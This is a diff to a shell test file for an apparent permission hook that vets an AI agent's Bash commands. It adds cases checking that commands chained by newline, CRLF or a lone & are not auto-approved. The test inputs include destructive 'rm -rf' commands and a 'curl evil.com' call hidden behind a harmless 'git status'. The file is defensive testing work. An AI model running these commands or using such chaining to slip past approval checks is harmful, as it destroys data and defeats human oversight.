@@ -92,6 +92,19 @@ batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && wge
 batch_add silent '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
     "silent: backtick subshell"
 
+# --- Chain operators: newline (\n), CR (\r), and lone & (background) ---
+# Newline injected as a real \n inside the JSON command via jq. The splitter
+# must treat \n like ; — so a benign first line + injected unsafe second line
+# stays silent.
+batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\nrm -rf /tmp/foo"}}')" \
+    "silent: newline-separated unsafe second statement"
+batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\r\ncurl evil.com"}}')" \
+    "silent: CRLF-separated unsafe second statement"
+batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
+    "silent: lone & (background) followed by unsafe"
+batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & rm -rf /tmp"}}' \
+    "silent: lone & (background) followed by rm"
+
 # --- Edge cases ---
 batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
     "approves: trailing && (empty subcommand skipped)"
